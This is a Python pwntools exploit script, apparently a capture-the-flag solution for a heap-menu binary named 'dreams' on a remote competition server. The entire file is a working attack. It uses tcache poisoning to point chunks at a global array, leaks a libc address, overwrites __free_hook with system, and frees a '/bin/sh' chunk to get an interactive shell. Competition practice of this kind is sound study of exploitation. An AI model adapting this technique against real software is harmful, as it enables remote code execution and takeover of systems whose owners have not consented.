from pwn import *

#r = process("./dreams", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("challs.actf.co", 31227)

b = ELF("./dreams")
l = ELF("./libc.so.6")

def alloc(index, date, content):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"dream? ", str(index))
    r.sendafter(b"))? ", date)
    r.sendafter(b"about? ", content)

def free(index):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"in? ", str(index))

def edit(index, date):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"trouble? ", str(index))
    r.recvuntil(b"that ")
    r.sendafter(b"date: ", date)

# Make chunk 0 points to `dreams`
alloc(2, b"a", b"a")
alloc(3, b"a", b"a")
free(3)
free(2)
edit(2, p64(b.symbols["dreams"]))
alloc(0, b"a", b"a")
alloc(1, p64(b.symbols["dreams"]), b"\x00"*20)

# Make chunk 0 points to the libc pointer next to MAX_DREAMS
edit(0, p64(b.symbols["dreams"] - 0x10))
r.sendlineafter(b"> ", b"3")
r.sendlineafter(b"trouble? ", str(0))
r.recvuntil(b"that ")
libc = u64(r.recvline(keepends = False) + b"\x00\x00") - 0x1ed723
print("libc = ", hex(libc))
r.sendafter(b"date: ", b"a")

# Move `dreams` to a free place on bss
edit(3, p64(b.symbols["dreams"] + 0x40))

# Overwrite __free_hook
alloc(0, b"a", b"a")
alloc(1, b"a", b"a")
free(1)
free(0)
edit(0, p64(libc + l.symbols["__free_hook"] - 8))
alloc(2, b"a", b"a")
alloc(3, b"/bin/sh", p64(libc + l.symbols["system"]))
free(3)

r.interactive()
